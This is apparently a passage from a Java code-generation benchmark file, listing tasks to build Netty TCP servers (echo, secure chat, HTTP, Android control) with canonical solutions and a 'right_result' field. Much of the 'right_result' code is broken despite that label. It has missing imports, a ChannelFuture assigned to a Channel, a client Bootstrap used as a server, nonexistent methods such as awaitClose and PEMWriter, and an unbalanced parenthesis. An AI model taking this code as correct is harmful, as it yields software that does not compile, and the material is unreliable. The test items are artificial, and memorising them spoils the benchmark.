io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            System.out.println(\"Client connected: \" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            System.out.println(\"Client disconnected: \" + ctx.channel().remoteAddress());\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            new TelnetServer().start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 181,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that can handle HTTP requests and responses efficiently with proper resource management.\n\nClass Description: NettyTCPServer is a class that creates and manages a TCP server using Netty framework. It handles HTTP protocol communication with clients, including request decoding, response encoding, chunked writes, and message aggregation. The server is designed to be non-blocking and supports graceful shutdown.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nchannel: Channel - The server's communication channel\nbossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\nworkerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n\nMethods:\nstart(): void - Starts the TCP server on the specified port. Initializes event loop groups, configures server bootstrap with HTTP handlers, and binds to the port. Throws InterruptedException if interrupted during startup.\nshutdown(): void - Gracefully shuts down the server by closing the channel and shutting down event loop groups. Handles any InterruptedException during shutdown.\n\nThe class uses Netty's NIO transport and includes HTTP-specific handlers for proper protocol handling. It maintains proper resource management through graceful shutdown mechanisms.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyTCPServer {\n\n    private static final Logger Logger = LoggerFactory.getLogger(NettyTCPServer.class);\n    private int port;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public NettyTCPServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup(2);\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            final ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 10240)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .childOption(ChannelOption.SO_SNDBUF, 1024*64)\n                .childOption(ChannelOption.SO_RCVBUF, 1024*64)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        socketChannel.pipeline().addLast(new HttpRequestDecoder());\n                        socketChannel.pipeline().addLast(new HttpResponseEncoder());\n                        socketChannel.pipeline().addLast(new ChunkedWriteHandler());\n                        socketChannel.pipeline().addLast(new HttpObjectAggregator(100 * 1024 * 1024));\n                    }\n                });\n\n            channel = b.bind(port).sync().channel();\n            Logger.info(\"Server started on port {}\", port);\n        } catch (Exception e) {\n            Logger.error(\"Failed to start server on port {}: {}\", port, e.getMessage());\n            throw e;\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n            try {\n                channel.closeFuture().sync();\n            } catch (InterruptedException e) {\n                Logger.error(\"Error during server shutdown: {}\", e.getMessage());\n            }\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport java.nio.charset.StandardCharsets;\n\npublic class NettyTCPServer {\n    private int port;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public NettyTCPServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new HttpServerCodec());\n                        ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                        ch.pipeline().addLast(new HttpServerHandler());\n                    }\n                })\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .childOption(ChannelOption.SO_REUSEADDR, true);\n\n        channel = bootstrap.bind(port).sync().await();\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.closeFuture().awaitUninterruptibly();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    private static class HttpServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) {\n            String response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\";\n            FullHttpResponse responseMsg = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n            responseMsg.content().writeBytes(response.getBytes(StandardCharsets.UTF_8));\n            ctx.write(responseMsg);\n            ctx.flush();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 182,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to echo back any received messages to clients.\n\nClass Description: The EchoServer class is a Netty-based TCP server that listens on a specified port and echoes back any data received from connected clients. It manages server lifecycle including startup, shutdown, and resource cleanup.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and distributes them to workerGroup\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for established connections\n- bootstrap: [ServerBootstrap] - Netty server configuration and management object\n- DEFAULT_PORT: [int] - Default port number (7) to use when no port is specified\n\nMethods:\n- EchoServer() -> [void] - Constructor that initializes bossGroup, workerGroup and bootstrap\n- start([int port]) -> [void] - Starts the server on specified port, configures channel pipeline and binds to port\n- shutdown() -> [void] - Gracefully shuts down the server and releases all resources\n- main([String[] args]) -> [void] - Entry point that parses command line arguments and starts the server",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws InterruptedException {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new EchoServerHandler())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"EchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.NioServerSocketChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.CharsetUtil;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.SimpleChannelInboundHandler;\n\npublic class EchoServer {\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final ServerBootstrap bootstrap = new ServerBootstrap();\n    private static final int DEFAULT_PORT = 7;\n\n    public EchoServer() {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new StringDecoder());\n                        pipeline.addLast(new StringEncoder());\n                        pipeline.addLast(new EchoServerHandler());\n                    }\n                });\n    }\n\n    public void start(int port) {\n        bootstrap.bind(port).await();\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                System.err.println(\"Usage: java EchoServer [port]\");\n                System.exit(1);\n            }\n        }\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n\n    private static class EchoServerHandler extends SimpleChannelInboundHandler<String> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n            ctx.writeAndFlush(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 183,
    "Instruction": "Task Description: Create a Java class that implements a secure TCP chat server using Netty framework, supporting SSL/TLS encryption for secure communication between clients and the server.\n\nClass Description: SecureChatServer is a Netty-based TCP server that listens for incoming client connections on a specified port, establishes secure SSL/TLS encrypted channels, and handles chat communication. The server uses a boss-worker thread model for efficient connection handling.\n\nAttributes:\nPORT: [static final int] - The port number on which the server listens for incoming connections, defaulting to 8992 if not specified via system property.\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the secure chat server. Creates a self-signed SSL certificate, configures Netty's event loop groups, sets up server bootstrap with SSL context and channel handlers, binds to the specified port, and maintains server operation until shutdown. Handles resource cleanup during shutdown.\n- Throws: Exception if any error occurs during server startup or operation",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class SecureChatServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public void start() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SecureChatServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInboundHandler;\nimport io.netty.channel.ChannelInitializer;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManagerFactory;\nimport javax.net.ssl.KeyManagerFactory;\nimport java.security.KeyStore;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.X509Certificate;\nimport java.security.cert.CertificateException;\nimport java.security.KeyPairGenerator;\nimport java.security.KeyPair;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.X509Certificate;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ByteArrayInputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.Date;\nimport java.util.Calendar;\n\npublic class SecureChatServer {\n\n    private static final int PORT = Integer.parseInt(System.getProperty(\"server.port\", \"8992\");\n\n    public void start() throws Exception {\n        // Generate self-signed certificate\n        SSLContext sslContext = createSSLContext();\n\n        // Configure event loop groups\n        EventLoopGroup bossGroup = new io.netty.channel.nio.NioEventLoopGroup();\n        EventLoopGroup workerGroup = new io.netty.channel.nio.NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new StringDecoder());\n                            pipeline.addLast(new StringEncoder());\n                            pipeline.addLast(new SslHandler(sslContext.createSSLEngine()));\n                            pipeline.addLast(new ChatServerHandler());\n                        }\n                    })\n                    .childOption(io.netty.channel.ChannelOption.SO_REUSEADDR, true)\n                    .childOption(io.netty.channel.ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(PORT).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private SSLContext createSSLContext() throws Exception {\n        KeyStore keyStore = KeyStore.getInstance(\"JKS\");\n        keyStore.load(null, null);\n\n        KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"RSA\");\n        kpg.initialize(2048, new SecureRandom());\n        KeyPair keyPair = kpg.generateKeyPair();\n\n        // Create a self-signed certificate valid for 365 days\n        Calendar calendar = Calendar.getInstance();\n        calendar.add(Calendar.DAY_OF_YEAR, 365);\n        Date notAfter = calendar.getTime();\n\n        X509Certificate certificate = (X509Certificate) CertificateFactory.getInstance(\"X.509\").generateCertificate(\n                new ByteArrayInputStream(\n                        new PEMWriter().writePEMCert(\n                                new X509CertificateImpl(keyPair.getPublic(), keyPair.getPrivate(), notAfter)\n                        )\n                )\n        );\n\n        keyStore.setKeyEntry(\"server\", keyPair.getPrivate(), \"password\".toCharArray(), new Certificate[]{certificate});\n\n        KeyManagerFactory kmf = KeyManagerFactory.getInstance(\"SunX509\");\n        kmf.init(keyStore, \"password\".toCharArray());\n\n        TrustManagerFactory tmf = TrustManagerFactory.getInstance(\"SunX509\");\n        tmf.init(keyStore);\n\n        return SSLContext.getInstance(\"TLS\")\n                .init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);\n    }\n\n    public static void main(String[] args) {\n        new SecureChatServer().start();\n    }\n}"
  },
  {
    "Task_id": 184,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and echo back received messages. The server should support optional SSL encryption and be configurable via system properties.\n\nClass Description: EchoServer is a Netty-based TCP server that listens for incoming connections on a specified port and echoes back any received data. It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be enabled (configured via system property \"ssl\")\n- PORT: int - The port number on which the server will listen (configured via system property \"port\", defaults to 8007)\n\nMethods:\n- start(): void - Starts the Netty TCP server, configures SSL if enabled, sets up event loop groups, and binds to the specified port. Throws Exception if any error occurs during startup.\n  - Input: None\n  - Output: None (void)\n  - Description: Initializes the server with boss and worker event loop groups, configures the server bootstrap with channel options and handlers, and starts listening for incoming connections. The method blocks until the server channel is closed.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class EchoServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        final EchoServerHandler serverHandler = new EchoServerHandler();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(serverHandler);\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.TrustManager;\nimport io.netty.handler.ssl.X509TrustManager;\nimport io.netty.handler.codec.bytes.ByteArrayDecoder;\nimport io.netty.handler.codec.bytes.ByteArrayEncoder;\n\nimport javax.net.ssl.SSLException;\nimport java.security.KeyManager;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.Arrays;\n\npublic class EchoServer {\n    private final boolean ssl;\n    private final int port;\n\n    public EchoServer() {\n        this.ssl = Boolean.getBoolean(\"ssl\");\n        this.port = Integer.getInteger(\"port\", 8007);\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .option(ChannelOption.SO_BACKLOG, 100)\n                    .handler(new LoggingHandler(LogLevel.INFO));\n\n            SslContext sslCtx = null;\n            if (ssl) {\n                sslCtx = new SslContextBuilder()\n                        .keyManager(\"server.key\", \"server.p12\", \"password\")\n                        .trustManager(\"server.trust\", \"server.trust\", \"password\")\n                        .build();\n            }\n\n            bootstrap.childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(Channel ch) throws Exception {\n                    ch.pipeline().addLast(new ByteArrayDecoder());\n                    ch.pipeline().addLast(new ByteArrayEncoder());\n                    ch.pipeline().addLast(new EchoHandler());\n                }\n            });\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private static class EchoHandler extends SimpleChannelInboundHandler<ByteBuf> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) {\n            ctx.write(msg);\n            msg.release();\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            new EchoServer().start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 185,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process TCP requests.\n\nClass Description: The AndroidControlServer class is a Netty-based TCP server that listens on a specified port, accepts incoming client connections, and processes TCP requests using a custom handler. It manages server resources and provides graceful shutdown capabilities.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Processes the accepted connections' network traffic\n\nMethods:\n- listen: [listen(int port)] -> [void] - Starts the TCP server on the specified port, configures server options, and sets up the request handler pipeline. The method blocks until the server channel is closed.\n  - Input Parameters:\n    - port: [int] - The port number on which the server should listen\n  - Throws:\n    - InterruptedException - If the thread is interrupted while waiting for the server to shutdown",
    "Canonical_solution": "import com.yeetor.server.handler.TCPHandler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class AndroidControlServer {\n\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n    public void listen(int port) throws InterruptedException {\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(\"tcp\", new TCPHandler());\n                        }\n                    });\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class AndroidControlServer {\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n\n    public AndroidControlServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n    }\n\n    public void listen(int port) throws InterruptedException {\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ch.pipeline().addLast(new StringDecoder());\n                             ch.pipeline().addLast(new StringEncoder());\n                             ch.pipeline().addLast(new AndroidControlHandler());\n                         }\n                     })\n                     .option(ChannelOption.SO_BACKLOG, 100)\n                     .childOption(ChannelOption.SO_REUSEADDR, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().awaitClose();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 188,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process their requests.\n\nClass Description: The MyServer class represents a Netty-based TCP server that listens on a specified port, accepts client connections, and processes incoming data through a configured pipeline of handlers.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nMyServer: [constructor](int port) -> void - Initializes the server with the specified port number\nrun: [method]() throws Exception -> void - Starts the server, binds to the configured port, and begins accepting client connections. Sets up the server bootstrap with worker threads, channel type, and handler pipeline. Includes proper resource cleanup on shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class MyServer {\n\n    private int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(\"logging\", new LoggingHandler(LogLevel.INFO));\n                     ch.pipeline().addLast(\"codec\", new MyCodec());\n                     ch.pipeline().addLast(new MyServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start listen at \" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\n\npublic class MyServer {\n    private final int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .option(ChannelOption.SO_BACKLOG, 100)\n                    .childOption(ChannelOption.SO_REUSEADDR, true)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            